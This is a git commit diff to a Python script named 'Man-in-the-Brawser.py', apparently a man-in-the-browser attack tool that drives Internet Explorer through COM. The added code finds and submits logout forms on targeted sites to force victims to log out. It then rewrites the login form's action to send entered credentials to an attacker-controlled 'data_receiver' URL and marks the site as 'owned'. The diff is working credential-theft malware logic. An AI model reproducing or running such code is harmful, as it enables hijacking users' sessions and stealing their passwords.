8e2d01ab8cfb7916569db62f998e0d8b090dac9c
wratter <33979004+wratter@users.noreply.github.com>
2018-04-29 17:46:00 +0930

    modified functionalites
    added instructions to wait for the page to load and modify the browser

--- Man-in-the-Brawser.py
+++ Man-in-the-Brawser.py
@@ -50,5 +50,39 @@ while True:
                         #find logout form and submit it
                         if i.id == target_sites[url.hostname]["logout_form"]:
                             i.submit()
+                            wait_for_browser(browser)           
+            else:
+                
+                #retrieve all the elements in the document
+                full_doc = browser.Document.all
+
+                #iterate looking for the logout form
+                for i in full_doc:
+                    try:
+
+                        #find logout form and submit it
+                        if i.id == target_sites[url.hostname]["logout_form"]:
+                            i.submit()
                             wait_for_browser(browser)
+                    except:
+                        pass
+
+    #now we modify the login form 
+    try:
+        login_index = target_sites[url.hostname]["logout_form"]
+        login_page = urllib.quote(browser.LocationUrl)
+        browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
+        target_sites[url.hostname]["owned"] = True
+    except:
+        pass
+time.sleep(5)
+
+
+def wait_for_browser(browser):
+
+    #wait for the browser to finish loading a page
+    while  browser.ReadyState != 4 and browser.ReadyState != "complete":
+        time.sleep(0.1)
+    return
+    
 
